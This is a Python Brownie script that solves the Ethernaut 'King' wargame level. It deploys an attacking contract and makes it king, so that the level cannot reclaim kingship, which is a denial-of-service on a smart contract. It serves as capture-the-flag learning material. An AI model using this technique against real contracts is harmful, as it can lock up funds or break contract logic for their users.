from scripts.helper.context import *
from scripts.helper.account import _from, acc
from scripts.helper.web3 import web3
from brownie import King, KingAttack

##########################################
# The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD
#
# Such a fun game. Your goal is to break it.
#
# When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
#########################################

# solve the challenge
def solve_challenge():
    # load challenge
    king = load_challenge(ContractObject=King, instance_key='king')
    kingattack = KingAttack.deploy(EthernautInstances['king'], _from)
    
    # call becomeKing() in the attacking contract to make the contract address the king
    kingattack.becomeKing({'value':int(web3.eth.getStorageAt(king.address, '0x01').hex(),16)} | _from)

    # check if the contract address is king
    king_assertion = king._king() == kingattack.address
    print(f'The contract address {kingattack.address} is the king: {king_assertion}')

    return(king_assertion)
    
def main():
    solve_challenge()
